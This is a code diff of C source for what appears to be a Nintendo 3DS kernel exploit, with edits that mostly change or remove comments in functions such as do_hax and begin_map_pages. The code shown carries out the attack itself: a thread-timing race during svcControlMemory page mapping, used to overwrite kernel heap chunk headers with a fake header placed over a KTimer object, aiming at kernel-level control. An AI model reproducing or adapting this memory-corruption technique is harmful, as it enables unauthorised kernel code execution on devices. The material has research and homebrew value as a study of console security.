@@ -55,7 +55,7 @@ static void allocate_thread(void* arg) {
     data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
-// Maps pages with chunk headers present.
+// Maps pages with block headers present.
 static bool begin_map_pages(AllocateData* data) {
     // Create thread to slow down svcControlMemory execution.
     Thread delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
@@ -76,7 +76,6 @@ static bool begin_map_pages(AllocateData* data) {
 
 // Waits for a raw page to be mapped.
 static void wait_raw_mapped(u32 addr) {
-    // Retrieve arbiter.
     Handle arbiter = __sync_get_arbiter();
 
     // Use svcArbitrateAddress to detect when the memory page has been mapped.
@@ -99,10 +98,8 @@ static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset
 
 // Executes exploit.
 void do_hax() {
-    // Debug output.
     printf("Setting up...\n");
 
-    // Allow threads on core 1.
     aptOpenSession();
     if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
         printf("Failed to allow threads on core 1.\n");
@@ -111,7 +108,6 @@ void do_hax() {
 
     aptCloseSession();
 
-    // Prepare allocate data.
     AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
     if(data == NULL) {
         printf("Failed to create allocate data.\n");
@@ -122,7 +118,7 @@ void do_hax() {
     data->size = PAGE_SIZE * 2;
     data->result = -1;
 
-    // Isolate a single page between others to ensure using the next chunk.
+    // Isolate a single page between others to ensure using the next pointer.
     u32 isolatedPage = 0;
     if(R_FAILED(svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
         printf("Failed to allocate isolated page.\n");
@@ -155,17 +151,16 @@ void do_hax() {
         goto cleanup;
     }
 
-    // Retrieve the timer object and create a pointer to our fake header.
+    // Retrieve a kernel pointer to the timer object and create a pointer to our fake header.
+    // refCount = size, syncedThreads = next, firstThreadNode = prev
     KTimer* timerObj = (KTimer*) (timerAddr - 4);
     MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->refCount;
 
-    // Allocate a buffer to back up the allocated kernel page before it is cleared by the allocation code.
+    // Allocate a buffer to back up the kernel page before it is cleared by the allocation code.
     //void* backup = malloc(PAGE_SIZE);
 
-    // Debug output.
     printf("Mapping pages for overwrite...\n");
 
-    // Map the pages.
     if(!begin_map_pages(data)) {
         printf("Failed to create memory map threads.\n");
         goto cleanup;
@@ -179,7 +174,6 @@ void do_hax() {
     wait_raw_mapped(data->addr + PAGE_SIZE);
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
 
-    // Debug output.
     printf("Post-overwrite control result: 0x%08X\n", (int) data->result);
 
     // Wait for memory mapping to complete.
